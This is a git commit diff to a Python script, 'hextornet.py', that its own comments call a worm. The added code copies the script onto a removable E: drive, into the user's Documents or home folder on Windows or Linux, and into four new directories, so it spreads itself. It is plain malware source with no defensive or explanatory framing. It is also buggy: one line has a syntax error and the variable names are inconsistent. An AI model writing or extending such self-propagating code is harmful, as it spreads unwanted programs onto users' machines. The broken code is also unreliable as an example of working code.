21cc3b18b8312f1cbc0add5dd7352a1db9213e52
Hector Torres <hectormtc@live.com>
2018-09-23 00:23:57 +0000

    Update

--- hextornet.py
+++ hextornet.py
@@ -13,11 +13,42 @@ import shutil
 
 def propagate():
 	#gets the current location of the worm
-	src=os.path.abspath("worm.py")
-	print(src)
+	src = os.path.abspath("hextornet.py")
+	
+	usr = getpass.getuser()
 	
 	if(os.path.isdir("E:\\")):
-		dts="E:"+"\\hextornet.py"
+		dts = "E:" + "\\hextornet.py"
 		print(dts)
 
-print(propagate())
+	#checks for Documents folder in Linux
+	elif(os.path.isdir("/home/" + usr + "/Documents/")):
+		dst = "/home/" + usr + "/Documents/" + "hextornet.py"
+	
+	#checks for Documents folder in Windows
+	elif(os.path.isdir("C:\\Users\\" + usr + "\\Documents")):
+		dst = "C:\\Users\\" + usr + "\\Documents\\"+"hextornet.py"
+
+	#checks for C:/ drive on windows
+	elif(os.path.isdir("C:\\")):
+		dst = "C:\\Users\\" + usr + "\\hextornet.py"
+
+	else:
+		dst = os.getcwd() + "hextornet.py"
+
+	copyfile(src, dst)
+	print("Worm location")
+	print("dst:", dst)
+	print("src:", src)
+
+def copy():
+	script = argv
+	name = str(script[0]
+	b = os.path.getsize(os.path.abspath("C:"))
+	for i in range(0, 4):
+		directoryName = "copy"+str(i)
+		os.mkdir(directoryName)
+		shutil.copy(name, directoryName)
+		src = os.path.abspath(directoryName)
+
+propagate()
